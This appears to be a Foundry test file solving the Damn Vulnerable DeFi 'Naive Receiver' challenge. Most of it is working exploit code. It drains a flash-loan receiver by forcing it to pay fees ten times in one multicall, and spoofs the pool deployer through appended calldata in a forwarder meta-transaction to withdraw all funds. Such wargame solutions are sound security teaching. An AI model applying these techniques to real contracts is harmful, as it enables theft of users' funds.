// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory flashLoanDataArray = new bytes[](11);

        for (uint256 i = 0; i < 10; i++) {
            bytes memory flashLoanData = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                receiver,
                weth,
                3e18,
                bytes("")
            );
            flashLoanDataArray[i] = flashLoanData;
        }

        bytes memory flashLoanDataWithdraw = abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL + WETH_IN_RECEIVER,
            payable(recovery)
        );

        flashLoanDataArray[10] = abi.encodePacked(
            flashLoanDataWithdraw,
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, flashLoanDataArray);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: address(player),
            target: address(pool),
            value: 0e18,
            gas: 1000000000,
            nonce: forwarder.nonces(player),
            data: callData,
            deadline: block.timestamp + 1 hours
        });
        // Compute the hash of the request
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // Sign the hashed data
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the forwarder request
        bool success = forwarder.execute{value: 0e18}(request, signature);
        assert(success);
        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }

    /**Working it out */
    function testSingleFlashLoan() public {
        bytes memory flashLoanData = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            receiver,
            weth,
            3e18,
            bytes("")
        );

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: address(player),
            target: address(pool),
            value: 0e18,
            gas: 1000000000,
            nonce: 0,
            data: flashLoanData,
            deadline: block.timestamp + 1 hours
        });

        // Compute the hash of the request
        bytes32 requestHash = forwarder.getDataHash(request);

        // Compute the EIP-712 typed data hash
        bytes32 typedDataHash = keccak256(
            abi.encodePacked(
                "\x19\x01", // EIP-712 prefix
                forwarder.domainSeparator(), // EIP-712 domain separator from the forwarder
                requestHash // Hash of the request data
            )
        );

        // Sign the hashed data
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the forwarder request
        bool success = forwarder.execute{value: 0e18}(request, signature);
        assert(success);
    }

    function testTenFlashLoans() public {
        bytes[] memory flashLoanDataArray = new bytes[](10);

        for (uint256 i = 0; i < 10; i++) {
            bytes memory flashLoanData = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                receiver,
                weth,
                3e18,
                bytes("")
            );
            flashLoanDataArray[i] = flashLoanData;
        }

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, flashLoanDataArray);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: address(player),
            target: address(pool),
            value: 0e18,
            gas: 1000000000,
            nonce: forwarder.nonces(player),
            data: callData,
            deadline: block.timestamp + 1 hours
        });
        // Compute the hash of the request
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // Sign the hashed data
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the forwarder request
        bool success = forwarder.execute{value: 0e18}(request, signature);
        assert(success);
        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );
    }

    function testHackFlashLoans() public {
        bytes[] memory flashLoanDataArray = new bytes[](11);

        for (uint256 i = 0; i < 10; i++) {
            bytes memory flashLoanData = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                receiver,
                weth,
                3e18,
                bytes("")
            );
            flashLoanDataArray[i] = flashLoanData;
        }

        bytes memory flashLoanDataWithdraw = abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL + WETH_IN_RECEIVER,
            payable(recovery)
        );

        flashLoanDataArray[10] = abi.encodePacked(
            flashLoanDataWithdraw,
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, flashLoanDataArray);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: address(player),
            target: address(pool),
            value: 0e18,
            gas: 1000000000,
            nonce: forwarder.nonces(player),
            data: callData,
            deadline: block.timestamp + 1 hours
        });
        // Compute the hash of the request
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // Sign the hashed data
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the forwarder request
        bool success = forwarder.execute{value: 0e18}(request, signature);
        assert(success);
        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );
    }
}
